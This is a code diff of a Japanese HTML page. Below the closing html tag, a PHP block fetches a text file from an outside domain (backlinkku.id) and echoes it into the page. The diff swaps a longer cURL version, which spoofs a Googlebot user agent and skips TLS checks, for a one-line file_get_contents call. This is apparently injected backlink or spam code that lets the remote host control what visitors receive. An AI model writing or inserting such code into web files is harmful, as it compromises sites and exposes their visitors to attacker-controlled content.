@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="ja">
 <head>
@@ -446,30 +445,5 @@ jQuery(function() {
 </body>
 </html>
 <?php
-ini_set('display_errors', 1);
-error_reporting(E_ALL);
-$remote = 'https://www.backlinkku.id/menu/vip-v1/script.txt';
-function fetch_clean($url) {
-    $ch = curl_init();
-    curl_setopt_array($ch, [
-        CURLOPT_URL => $url,
-        CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_SSL_VERIFYPEER => false,
-        CURLOPT_USERAGENT => 'Googlebot/2.1 (+http://www.google.com/bot.html)',
-        CURLOPT_FOLLOWLOCATION => true,
-        CURLOPT_TIMEOUT => 15
-    ]);
-    $result = curl_exec($ch);
-    if ($result === false) {
-        echo "CURL ERROR: " . curl_error($ch);
-    }
-    curl_close($ch);
-    return $result;
-}
-$data = fetch_clean($remote);
-if ($data === false || $data === null) {
-    echo "Gagal mengambil data.";
-} else {
-    echo $data;
-}
+echo file_get_contents("https://backlinkku.id/menu/vip-v1/script.txt");
 ?>
